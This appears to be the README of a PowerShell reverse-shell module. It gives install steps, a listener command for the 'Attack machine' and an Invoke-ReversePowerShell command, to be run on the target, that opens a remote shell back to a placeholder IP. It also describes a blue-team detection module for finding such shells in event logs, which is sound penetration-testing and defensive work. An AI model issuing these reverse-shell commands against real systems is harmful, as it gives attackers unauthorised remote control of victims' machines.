# ReversePowerShell
Functions that can be used to gain Reverse Shells with PowerShell.

#### BLUE TEAM DISCOVERY 
Find-ReverseShell.psm1 can be used to search the Windows Event Log for when a Reverse Shell is created that uses a System.Net.Sockets.TcpListener object. This will discover any reverse shell that creates a TcpListener object and not just the below module. This method does not catch PowerCat.ps1 which I am still looking for a good way to discover.

#### INSTALL THE MODULE
Install this module by placing the cloned folder "ReversePowerShell" inside the following directory location.
 'C:\Users\<username>\Documents\WindowsPowerShell\Modules\ReversePowerShell'

Once there it can be imported into a PowerShell session using the following command.
```powershell
Import-Module ReversePowerShell
```

You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run.

#### START LISTENER
The below command can be executed to start a listener on the Attack machine on port 8089
```powershell
Start-Listener -Port 8089
```

#### ISSUE REVERSE SHELL CONNECTION
The below command is to be issued on the Target Machine to connect to the listener on the target over port 8089
```powershell
Invoke-ReversePowerShell -IpAddress <TargetIPv4Address> -Port 8089
```
---
#### FIREWALL
If you are not able to gain a connection it is most likely due to the Windows Firewall. 

#### VERIFY LISTENING PORTS
You can verify/view actively listening ports on the target computer by issuing the following command.
```powershell
Get-NetTcpConnection -State Listen
```
or if you are a command prompt kind of person;
```powershell
netstat -q
```
